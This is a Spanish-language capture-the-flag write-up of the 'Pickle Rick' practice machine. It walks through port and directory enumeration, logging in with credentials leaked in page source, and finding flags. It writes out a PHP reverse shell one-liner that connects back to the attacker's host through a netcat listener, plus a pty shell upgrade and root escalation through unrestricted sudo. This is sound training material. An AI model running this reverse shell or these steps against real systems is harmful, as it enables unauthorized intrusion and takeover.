---
Titulo: Pickle Rick
Fecha: 28-07-2025
categoria: [Hacking web, reverse shell]
Dificultad_oficial: Fácil
Dificultad_percibida: Fácil
Estado: Terminado
---
## 1. Descripción del reto
Esta máquina nos encontraremos con un servicio web y ssh. Donde la página web tiene formularios de login y ejecución de comandos remota.

## 2. Enumeración / Reconocimiento
Primero que nada como siempre vamos a hacer un primer escaneo de puertos con el cual vamos a averiguar puertos abiertos de la máquina.
```shell
root@ip-10-10-176-88:~# nmap -sS -sV -sC -Pn 10.10.64.61
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-28 17:21 BST
Nmap scan report for ip-10-10-64-61.eu-west-1.compute.internal (10.10.64.61)
Host is up (0.0012s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Rick is sup4r cool
MAC Address: 02:07:DA:82:50:C7 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.17 seconds
```

Lo primero que observo es que la máquina solo tiene dos puertos abiertos el 22 y el 80 (SSH y HTML), ya que no tenemos nada para vulnerar el ssh vamos a ver que hay dentro de la página web del puerto 80.

![[Pasted image 20250728172309.png]]

Lo primero que observo al entrar es la obvia gran imagen que hay y la pequeña introducción que nos da *rick*. Voy a analizar el código fuente de la página para ver si hay información relevante en el, después voy a revisar la consola en buscar de lo mismo, por último voy a ver si hay más directorios que puedan ser útiles con las herramientas `dirsearch` y `gobuster`.

```html
<!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```

La primera y única observación que noto es que hay una nota con el usuario que parece que necesitaremos ó para iniciar sesión en la computadora o en el SSH. Continuo revisando la consola.

>[!info] No encontré nada en la consola, continuo con las herramientas mencionadas

```shell

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /root/reports/http_10.10.64.61/__25-07-28_17-32-53.txt

Target: http://10.10.64.61/

[17:32:53] Starting: 
[17:33:20] 200 -  588B  - /assets/
[17:33:20] 301 -  311B  - /assets  ->  http://10.10.64.61/assets/
[17:33:44] 200 -  455B  - /login.php
[17:34:01] 200 -   17B  - /robots.txt
```

Veo que las hay dos páginas que parecen interesantes `login.php` y `robots.txt`, no obstante voy a lanzar también la herramienta `gobuster` para ver si puedo encontrar algo más.

```shell
root@ip-10-10-176-88:~# gobuster dir -u "http://10.10.64.61/" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php,html,js,py
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.64.61/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,html,js,py
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 276]
/.php                 (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 1062]
/login.php            (Status: 200) [Size: 882]
/assets               (Status: 301) [Size: 311] [--> http://10.10.64.61/assets/]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/robots.txt           (Status: 200) [Size: 17]
/.html                (Status: 403) [Size: 276]
/.php                 (Status: 403) [Size: 276]
/denied.php           (Status: 302) [Size: 0] [--> /login.php]
/server-status        (Status: 403) [Size: 276]
/clue.txt             (Status: 200) [Size: 54]
Progress: 1323360 / 1323366 (100.00%)
===============================================================
Finished
===============================================================
```

Vale hemos encontrado cosas bastante interesantes que antes no vimos como `portal` y `clue`. Por lo que ahora si vamos a analizar cada página por separado.
## 3. Explotación / Desarrollo
### Flag 1
Lo primero que voy a revisar es el archivo `robots.txt` ya que es lo más importante de todo ya que nos puede llevar a páginas que no puedo llegar a ver desde fuera.

```text
Wubbalubbadubdub
```

Cuando entro en la pagina web, esto es lo único que nos aparece... No se bien que puedo hacer con ella, voy a ver si con el aparatado de login que antes nos dio un 200 puedo hacer algo con el código fuente o algo.

![[Pasted image 20250728174950.png]]

No parece haber nada de interés por esta pagina ni en el código fuente, bueno voy a probar suerte y ver si con los datos que ya tengo puedo hacer algo, pondré el  usuario `R1ckRul3s` y el otro dato que tengo que lo pondré en contraseña `Wubbalubbadubdub`.

![[Pasted image 20250728175228.png]]

Vale, parece que hay un apartado para poner comandos, lo primero que se me viene a la mente es hacer una reverse shell, pero primero voy a ver si hay algo interesante en las otras paginas, además de mirar el código fuente.

>[!info] Las otras páginas estaban ocultas, ya que no soy el verdadero rick

```html
<!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== -->
```

Al revisar el código fuente veo que hay una nota que parece que el texto esta codificado en base64, por lo que lo voy a llevar a un decodificador de base64 (En mi caso use ciberchef) y el resultado decodificado es `rabbit hole`, puede que sea algún tipo de usuario y contraseña ? Bueno, me queda por probar un revershell y modificación de cookies, por facilidad voy a empezar por la de cookies.

>[!info] Lo de las cookies, de momento no me ha funcionado pero puede que funcione o sea de utilidad en un futuro.

>[!info] Nota a 22:12 del mismo día, veo que con lo de `rabbit hole` se estaban burlando de mi 🤣, me lo trague enterito


```shell
root@ip-10-10-176-88:~# nc -lvnp 8080
Listening on 0.0.0.0 8080
Connection received on 10.10.64.61 37172
ls
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
cat Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair
```

Hice una reverse shell con php (`php -r '$sock=fsockopen("10.10.176.88",8080);exec("sh <&3 >&3 2>&3");'`) y obtuve mi terminal, hice un `ls` y vi que el primer resultado es una de las flags, por lo que me dispongo a leerla y ya tendríamos la primera flag, ahora vamos a por la segunda.

### Flag 2
```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ip-10-10-64-61:/var/www/html$
```
Antes de continuar quiero upgradear mi shell ya que la que tengo es bastante ineficiente.

```shell
www-data@ip-10-10-64-61:/home/rick$ cat 'second ingredients'
cat 'second ingredients'
1 jerry tear
```

Después me puse a navegar por los archivos y vi que hay un home de `rick`, por lo que vi lo que había dentro y  encontré la segunda flag, ahora vamos a ver si podemos ser root o que más podemos averiguar.
## 4. Post‑explotación (si aplica)
### Flag 3
```shell
root@ip-10-10-94-226:~# ls
3rd.txt  snap
root@ip-10-10-94-226:~# cat 3rd.txt
3rd ingredients: fleeb juice
root@ip-10-10-94-226:~# pwd
/root
www-data@ip-10-10-94-226:/$ sudo -l
Matching Defaults entries for www-data on ip-10-10-94-226:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-94-226:
    (ALL) NOPASSWD: ALL
```

Y como era de esperar teniendo todos los permisos y encima sin pedir contraseña solo teníamos que hacer un sudo su para elevar privilegios y obtener root y entrar dentro de la carpeta `root` para encontrarnos el último ingrediente. 

## 6. Notas y aprendizajes

- Punto fuerte: Esta sala me ha enseñado a siempre mirar el código fuente y empezar a pensar realmente como un hacker
    
- Dificultad encontrada: Ninguna
    
- Conceptos nuevos aprendidos: Siempre mirar las cosas dos veces incluso con herramientas diferentes ya que puedes encontrar cosas que antes no habías visto